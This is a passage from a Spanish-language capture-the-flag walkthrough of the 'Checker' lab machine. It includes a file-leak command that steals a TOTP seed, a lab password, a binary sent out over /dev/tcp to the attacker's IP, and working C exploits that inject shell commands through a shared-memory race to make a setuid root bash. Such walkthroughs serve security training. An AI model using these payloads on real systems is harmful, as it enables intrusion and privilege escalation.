python3 filters_chain_oracle_exploit.py --target http://checker.htb/ajax/page/8/save-draft --verb PUT --headers '{"X-CSRF-TOKEN":"SALXAJwM3bsKsxSLIKrZkHa3VQymB8KmvWlKEKSw", "Cookie": "XSRF-TOKEN=eyJpdiI6IjN2WkoxOU5jOWJoc0l3d3paTzd4RWc9PSIsInZhbHVlIjoiaEpmdVpwRkwxZHVtVHIwOVFZME9nYWJCWnpmbmpiMnhkdVc1R3hIelozcUlmdEFJTkVwZG9XMHA1WkN6ZGp2eHhBUUQ5Wk0vN2V6RHkvRHFFYlFSQUxJZDBzdmVnck50dmpxUDFENU1MZ3gvM3dqVytDK3NXam56T1hzMW82Z1EiLCJtYWMiOiJkNTNkMTk2NmJmZDI5ZTNhNDJhY2ZjOWFmMTUyZTk1ODU2NjIzMGMyNjZlOWMwNjQ0MTVjMTc3ZjI0NzQ2MWI0IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IjlJdERncFZtb2R2OGxHV1hQU0Y0UkE9PSIsInZhbHVlIjoiNlJzanY3ZGR5TlJ0MnNMZTJkeS9HRmlqSVYyMTVtZUZGK2JOcUJnOUhOZ1pnaGcxU25wQjViR0pHOGVCMWVpcmdJdmNCVGVCZWtpNUdHWnpULy9wTzdLM1VVZGwyMldabEFVOUVpQjZSWGJpSkRWVnRiLzBNYUZVYWd4djdlQlEiLCJtYWMiOiIyMTA2MTQ2NDM5YTgxYzU2YWJjMjRlYzhkOWExYTZiOTNhZTkwNGM2YmE1N2I1M2E3ZGUwZGMyODZkMDE3MGVkIiwidGFnIjoiIn0%3D; teampass_session=9jhnnd7uh10i4fahn339f3t7bm; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=10b09b297f024cdede07c5253bc2cc530351d0d6587d1b8add"}' --parameter html --file /backup/home_backup/home/reader/.google_authenticator

[*] The following URL is targeted : http://checker.htb/ajax/page/8/save-draft
[*] The following local file is leaked : /backup/home_backup/home/reader/.google_authenticator
[*] Running PUT requests
[*] Additionnal headers used : ...
[+] File /backup/home_backup/home/reader/.google_authenticator leak is finished!
RFZEQlJBT0RMQ1dGN0kyT05BNEs1TFFMVUUKIiBUT1RQX0FVVEgK
b'DVDBRAODLCWF7I2ONA4K5LQLUE\n" TOTP_AUTH\n'
~~~

Hemos obtenido la semilla secreta que usa `Google Authenticator` para generar códigos dinámicos: `DVDBRAODLCWF7I2ONA4K5LQLUE`. 

Usaremos el servicio [TOTP.app](https://totp.app/) para generar un código TOTP que podamos usar en la autenticación `ssh` como el usuario `reader`

![image-center](/assets/images/posts/checker-totp-app.png)


## Shell as `reader`

Una vez generado, recordemos que el código tiene una validez de `30` segundos, por lo que ya debemos tener la contraseña copiada en algún lado

~~~ bash
Code: 210877 # Ejemplo
Password: hiccup-publicly-genesis
~~~

Usaremos estas credenciales para autenticarnos por `ssh` como el usuario `reader`

~~~ bash
ssh reader@checker.htb
(reader@checker.htb) Password: 
(reader@checker.htb) Verification code: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
...
Last login: Sun Jun 1 18:21:15 2025 from 10.10.14.62
reader@checker:~$ 
reader@checker:~$ export TERM=xterm
~~~

Si aparece el siguiente error, intenta otra vez con el mismo código

~~~ bash
(reader@checker.htb) Verification code: 
Error "Operation not permitted" while writing config
~~~

En este punto ya podremos ver la flag del usuario no privilegiado

~~~ bash
reader@checker:~$ cat user.txt 
0a7...
~~~
<br>


# Escalada de Privilegios
---
## System Enumeration

Haremos una enumeración básica y manual del sistema con el propósito de identificar vías potenciales para escalar nuestros privilegios.

Comenzaremos comprobando la `ip` de la máquina para ver si estamos en la máquina real y no dentro de un contenedor (`10.10.11.56`)

~~~ bash
reader@checker:~$ hostname -I
10.10.11.56 dead:beef::250:56ff:fe95:5007
~~~

Si vemos los usuarios, podemos notar que solo somos `reader` y `root`, por lo que ahora debemos encontrar una vía para escalar nuestros privilegios directamente a `root`

~~~ bash
reader@checker:/opt/hash-checker$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
reader:x:1000:1000::/home/reader:/bin/bash
~~~


## Sudoers Privileges - `check-leak.sh`

Listando los privilegios `sudo` configurados para el usuario `reader`, podremos ejecutar 

~~~ bash
reader@checker:~$ sudo -l
Matching Defaults entries for reader on checker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
~~~

Viendo el contenido del script `check-leak.sh`, podemos ver las instrucciones que contiene, donde ejecuta `check_leak` enviando un nombre de usuario. Además podemos notar que está cargando el archivo `.env` 

~~~ bash
reader@checker:/opt/hash-checker$ cat check-leak.sh 
#!/bin/bash
source `dirname $0`/.env
USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
/opt/hash-checker/check_leak "$USER_NAME"
~~~

Veremos algunos archivos dentro del directorio `hash-checker`, donde solo tenemos capacidad para leer `check_leak`, `check-leak.sh` y `leaked_hashes.txt`

~~~ bash
reader@checker:~$ ls -la /opt/hash-checker/
total 68
drwxr-xr-x 2 root root  4096 Jan 30 17:09 .
drwxr-xr-x 5 root root  4096 Jan 30 17:04 ..
-r-------- 1 root root   118 Jan 30 17:07 .env
-rwxr--r-- 1 root root   141 Jan 30 17:04 check-leak.sh
-rwxr--r-- 1 root root 42376 Jan 30 17:02 check_leak
-rwx------ 1 root root   750 Jan 30 17:07 cleanup.sh
-rw-r--r-- 1 root root  1464 Jan 30 17:09 leaked_hashes.txt
~~~

Este último archivo parece ser que contiene hashes conocidos de la base de datos de `TeamPass` que explotamos anteriormente, porque al validar los usuarios que vimos podemos ver que `bob` tiene su contraseña comprometida 

~~~ bash
reader@checker:/opt/hash-checker$ sudo ./check-leak.sh admin
User is safe.
reader@checker:/opt/hash-checker$ sudo ./check-leak.sh bob
Password is leaked!
~~~

Esto es interesante para saber cómo se podría estar comportando el binario `check_leak`, que según esto parece conectarse con `TeamPass`. Si buscamos caracteres imprimibles dentro del binario, podemos ver que efectivamente hace consultas `SQL` a la base de datos

~~~ bash
reader@checker:/opt/hash-checker$ strings check_leak | grep -iE 'select|mysql \-u'4

SELECT pw FROM teampass_users WHERE login = '%s';
mysql -u %s -D %s -s -N -e 'select email from teampass_users where pw = "%s"'
~~~

### File Transfer

Transferiremos el binario `check_leak` a nuestra máquina víctima para analizarlo en profundidad. Primeramente pondremos un puerto a la escucha para recibir el ejecutable, en mi caso elegí el puerto `8000`, recuerda que **no debe estar ocupado por otro servicio**

~~~ bash
nc -lvnp 8000
~~~ 

Ahora enviamos el ejecutable abriendo una conexión TCP hacia nuestra máquina

~~~ bash
reader@checker:/opt/hash-checker$ cat check_leak > /dev/tcp/10.10.14.57/8000
~~~

Podemos verificar la integridad del archivo con el comando `md5sum`, donde calculamos el hash `MD5` resultante, ambos deben ser iguales

~~~ bash
reader@checker:/opt/hash-checker$ md5sum check_leak 
79a10fd7f9f7eef022f9aaf4c2c1d56c  check_leak

root@parrot:~# md5sum check_leak        
79a10fd7f9f7eef022f9aaf4c2c1d56c  check_leak
~~~


## Binary Analysis - `ghidra`

Usaremos la herramienta `ghidra` para ver el código del ejecutable y ver su lógica. Si consultamos las funciones definidas, notaremos que efectivamente se conecta a la base de datos de `TeamPass` haciendo consultas SQL

![image-center](/assets/images/posts/checker-ghidra.png)


## Race Condition

> En Linux, la memoria compartida (shared memory) **es un mecanismo de comunicación entre procesos (IPC) que permite a diferentes procesos acceder y modificar la misma región de memoria**
{: .notice--info}

Dentro de la función `main()` estaría definida la siguiente lógica:

- Si el hash del usuario existe dentro del archivo `leaked_hashes.txt`. Se inicia la función `notify_user()`
- Antes de notificar al usuario, el programa almacena el hash en la memoria compartida utilizando la función `write_to_shm()`
- Se espera un segundo antes de limpiar la memoria compartida, esto puede ocasionar `race condition`

> Race Condition es una **vulnerabilidad que ocurre cuando un sistema** que maneja tareas en una secuencia específica **es forzado a realizar dos o más operaciones simultáneamente**. 
{: .notice--info}

Esto nos permitiría tomar ventaja del intervalo de tiempo que se da entre que el hash está en la memoria compartida y el momento en el que desaparece dependiendo de los permisos que estén configurados

~~~ bash
          uVar2 = write_to_shm(__ptr); # Escribe en la memoria compartida
          printf("Using the shared memory 0x%X as temp location\n",(ulong)uVar2);
          if (DAT_8001913c != '\0') {
            __asan_report_load8(&stdout);
          }
          fflush(stdout);
          sleep(1); # Potencialmente peligroso
          notify_user(pcVar3,pcVar4,pcVar5,pcVar6,uVar2);
          clear_shared_memory(uVar2); # Limpieza luego de esperar un segundo
~~~

### Shared Memory Perms

Dentro de la función `write_to_shm()` encontraremos la siguiente línea

~~~ c
__shmid = shmget(iVar2 % 0xfffff,0x400,0x3b6);
~~~

> La función `shmget()` en C se utiliza para obtener acceso a un segmento de memoria compartida, ya sea creando uno nuevo o localizando uno existente en base a una clave dada.
{: .notice--info}

Esta sería la firma de la función `shmget`

~~~ c
int shmget(key_t key, size_t size, int shmflg);
~~~

- `key`: Un valor clave de tipo `key_t` que identifica el segmento de memoria compartida
- `size`: El tamaño deseado del segmento de memoria compartida en bytes
- `shmflg`: Define los **permisos de creación y de acceso al segmento**

En este contexto, `shm_get` define unos permisos: `0x3b6`

- `0x3b6` en octal: Permisos `666` para el segmento de memoria, o sea, **tenemos acceso al segmento con lectura y escritura**


## Reading Shared Memory

Podemos leer la memoria compartida con el comando `ipcs -m`, en este caso lo ejecutamos cada `1` segundo, puedes también usar `while true`

~~~ bash
reader@checker:/opt/hash-checker$ watch -n 1 ipcs -m
~~~

Ejecutaremos el binario para cargar el hash en la memoria compartida desde otra sesión con `ssh`

~~~ bash
reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
Password is leaked!
Using the shared memory 0x1AFD6 as temp location
User will be notified via bob@checker.htb
~~~

Veremos el valor de la dirección de memoria, además del usuario que lo ejecuta y los permisos, que en este caso es `root` porque lo estamos haciendo con `sudo`

~~~ bash
------ Shared Memory Segments --------
key        shmid      owner      perms      bytes      nattch     status      
0x0001afd6 32779      root       666        1024       0                         

~~~

Con la ayuda de `deepseek` rápidamente obtuve un script en C que accede a la memoria compartida para leer datos que se encuentren cargados en un segmento

> La variable `segment_id` corresponde al valor de `shmid` (Identificador del segmento de la memoria compartida), por lo que debemos considerar aumentar su valor en `1` a medida que ejecutamos el script `check-leak.sh`  
{: .notice--info}

> `poc.c`

~~~ c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>

int main(int argc, char *argv[]) {
    // Definimos el id del segmento de memoria: que lo obtenemos con:
    // |-> reader@checker:/tmp$ watch -n 1 ipcs -m
    int segment_id = 1;

    // Adjuntar memoria compartida
    char *shm_ptr = (char*) shmat(segment_id, NULL, 0);

    // Manejo de error
    if (shm_ptr == (char*)-1) {
        perror("shmat");
        return 1;
    }

    // Mensaje de comprobación
    printf("Contenido de la memoria compartida: %s\n", shm_ptr);

    // Desvincular (sin eliminar el segmento)
    shmdt(shm_ptr);

    return 0;
}
~~~

En mi caso ejecuté el binario `1` vez antes de ejecutar el script que se encarga de leer la memoria compartida, por lo que en el siguiente ejemplo tuve que enviar el número `1` (comienza en `0`) como `id`.

Compilaremos el script en la máquina víctima para poder ejecutarlo

~~~ bash
gcc poc.c -o poc
~~~

Antes de volver a ejecutar `check-leak.sh` con `sudo`, ejecutamos nuestro script, que estará intentando leer la memoria compartida constantemente, hasta que ejecutemos `check-leak.sh`

~~~ bash
reader@checker:/tmp$ while true; do ./poc && break; done
shmat: Invalid argument
shmat: Invalid argument
...
~~~

Como el hash del usuario `bob` está filtrado, debemos usarlo en cada ejecución de `check-leak.sh`

~~~ bash
reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
Password is leaked!
Using the shared memory 0x15EA as temp location
User will be notified via bob@checker.htb
~~~

Al volver a ejecutar `check-leak.sh` con el programa `poc` corriendo en la otra sesión, vemos lo que esperábamos, el hash del usuario `bob` cargado en el segmento de memoria

~~~ bash
...
Contenido de la memoria compartida: Leaked hash detected at Mon Jun  2 18:21:07 2025 > $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
~~~

> No tiene sentido intentar crackear este hash porque ya lo habíamos hecho previamente, solo estamos poniendo en práctica los conceptos que explotaremos más adelante
{: .notice--warning}

## Command Injection

Dentro de la función `notify_user()`, podemos ver la siguiente línea donde en su contexto no parece estar sanitizada, siendo posiblemente vulnerable a `command injection`

~~~ bash
iVar2 = snprintf((char *)0x0,0,
                             "mysql -u %s -D %s -s -N -e \'select email from teampass_users where pw  = \"%s\"\'"
                             ,param_2,param_4,uVar5)
~~~

### Proof of Concept

Modificaremos el exploit para que en vez de leer el contenido del segmento de la memoria compartida, intente ejecutar un comando enviándolo como parámetro a la línea de código anterior que ejecuta `mysql`

~~~ c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/shm.h>
#include <sys/stat.h>

int main() {
    // Definimos el id del segmento de memoria, que lo obtenemos con:
    // |-> reader@checker:/tmp$ watch -n 1 ipcs -m
    int segment_id = 2;

    // Adjuntar memoria compartida
    char *shm_ptr = (char*) shmat(segment_id, NULL, 0);

    // Manejo de error
    if (shm_ptr == (char*)-1) {
        perror("shmat");
        return 1;
    }

    // Eliminar saltos de línea del contenido original
    size_t len = strlen(shm_ptr);
    if (len > 0 && shm_ptr[len - 1] == '\n') {
        shm_ptr[len - 1] = '\0';
    }

    // Definimos lo que vamos a añadir a la memoria compartida
    const char *cmd = "'; touch /tmp/test; #";

    // Añadimos el contenido
    strcat(shm_ptr, cmd);

    // Mensaje de comprobación
    printf("Contenido de la memoria compartida: %s\n", shm_ptr);

    // Desvincular
    if (shmdt(shm_ptr) == -1) {
        perror("shmdt");
        return 1;
    }

    return 0;
}
~~~

Como se están realizando consultas `SQL` para obtener el hash del usuario que enviamos, debemos escapar de la query. En mi caso, intentaré cerrar la consulta e inyectar un comando que cree un archivo vacío en `/tmp` a modo de comprobación.

De esta forma, cuando ejecutemos el exploit, el comando de `mysql` que ejecuta el programa `check_leak` debería hacer lo siguiente

~~~ bash
mysql -u %s -D %s -s -N -e 'select email from teampass_users where pw  = "'; touch /tmp/test; # Comentario que evita error con la comilla"'
~~~

### Exploiting

Modificaremos el comando para hacer una copia de `bash` en el directorio `/tmp`, además de hacerla `siud`

~~~ c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/shm.h>
#include <sys/stat.h>

int main() {
    // Definimos el id del segmento de memoria
    // |-> reader@checker:/tmp$ watch -n 1 ipcs -m
    int segment_id = 3;

    // Adjuntar memoria compartida
    char *shm_ptr = (char*) shmat(segment_id, NULL, 0);

    // Manejo de error
    if (shm_ptr == (char*)-1) {
        perror("shmat");
        return 1;
    }

    // Eliminar saltos de línea del contenido original
    size_t len = strlen(shm_ptr);
    if (len > 0 && shm_ptr[len - 1] == '\n') {
        shm_ptr[len - 1] = '\0';
    }

    // Definimos lo que vamos a añadir a la memoria compartida
    const char *cmd = "'; cp /bin/bash /tmp/fakebash; chmod 4755 /tmp/fakebash; #";

    // Añadimos el contenido
    strcat(shm_ptr, cmd);

    // Mensaje de comprobación
    printf("Contenido de la memoria compartida: %s\n", shm_ptr);

    // Desvincular
    if (shmdt(shm_ptr) == -1) {
        perror("shmdt");
        return 1;
    }

    return 0;
}
~~~
  
Ahora debemos compilar nuestro exploit. **Por cada cambio que hagamos en el exploit debemos volver a compilarlo**

~~~ bash
reader@checker:/tmp$ gcc exploit.c -o shm_exec
~~~


## Root Time

Lanzaremos el exploit a modo de espera de la ejecución del binario `/opt/check-leak.sh`

~~~ bash
while true; do ./shm_exec && break; done
shmat: Invalid argument
shmat: Invalid argument
shmat: Invalid argument
~~~

Ahora ejecutamos el binario, deberíamos ver un error de sintaxis de `mysql`

~~~ bash
reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
Password is leaked!
Using the shared memory 0x7FB7D as temp location
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy' at line 1
Failed to read result from the db
~~~

Veremos el mensaje durante la ejecución del exploit, esto indica que podría haber funcionado

~~~ bash
while true; do ./shm_exec && break; done
shmat: Invalid argument
shmat: Invalid argument
shmat: Invalid argument
Contenido de la memoria compartida: Leaked hash detected at Mon Jun  2 16:05:23 2025 > $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy'; cp /bin/bash /tmp/fakebash; chmod 4755 /tmp/fakebash; #
~~~

Si listamos `/tmp`, podemos ver que se ha creado `fakebash`, y es `siud`. Usemos esta copia de `bash` para escalar a `root`

~~~ bash
reader@checker:~$ /tmp/fakebash -p
fakebash-5.1# id
uid=1000(reader) gid=1000(reader) euid=0(root) groups=1000(reader)
~~~

Ya podremos ver la flag del sistema y ya habríamos concluido la máquina, podemos eliminar al copia de `bash` y nuestro exploit para dejar limpio el sistema

~~~ bash
fakebash-5.1# cat /root/root.txt
27c...
~~~

Muchas gracias por leer y espero que hayas aprendido con esa guía, te dejo la cita random del día:

> The bird of paradise alights only upon the hand that does not grasp.
> — John Berry
{: .notice--info}
